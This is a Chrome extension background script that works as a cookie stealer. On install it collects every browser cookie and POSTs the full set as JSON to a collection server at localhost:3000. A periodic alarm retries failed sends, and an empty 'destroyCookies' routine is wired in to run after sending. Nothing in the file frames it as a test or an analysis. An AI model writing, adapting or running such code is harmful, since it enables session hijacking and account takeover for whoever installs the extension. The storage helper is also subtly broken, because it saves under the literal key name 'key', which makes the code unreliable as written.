const interval = 1; // min

(async () => {

    const setStore = async (key, value) => await chrome.storage.local.set({key: value });
    const getStore = async (key) => (await chrome.storage.local.get(key))[key];

    async function destroyCookies() {}

    async function sendData(data) {
        const url = "http://localhost:3000/";
        try {
            const res = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
            });
            await res.text();
            return true;
        } catch (e) {
            return false;
        }
    }

    async function sendCookies() {
        const cookies = await chrome.cookies.getAll({});
        const sent = await sendData(cookies);
        if (sent) 
            await setStore("areCookiesPending", "false");
        else 
            await setStore("areCookiesPending", "true");
        return sent;
    }
    
    chrome.runtime.onInstalled.addListener(async (details) => {
        await setStore("areCookiesPending",  "false");
        await setStore("areInfoPending", "false");
        await setStore("destroyCookies", "true");

        const sent = await sendCookies();
        if (sent) destroyCookies();
    });
    
    chrome.windows.onCreated.addListener(async () => {
        await chrome.alarms.create("retry_sending_info", {delayInMinutes: interval, periodInMinutes: interval});
    });

    chrome.alarms.onAlarm.addListener( async (alarm) => {
        const cookiesPending = (await getStore("areCookiesPending")) == "true";
        const infoPending = (await getStore("areInfoPending")) == "true";
        if (!cookiesPending && !infoPending) return;

        if (cookiesPending) {
            const sent = await sendCookies();
            if (sent) {
                if((await getStore("destroyCookies")) == "true")
                    await destroyCookies();
                await setStore("areCookiesPending",  "false");
            } else await setStore("areCookiesPending", "true");
        }
    });
})();
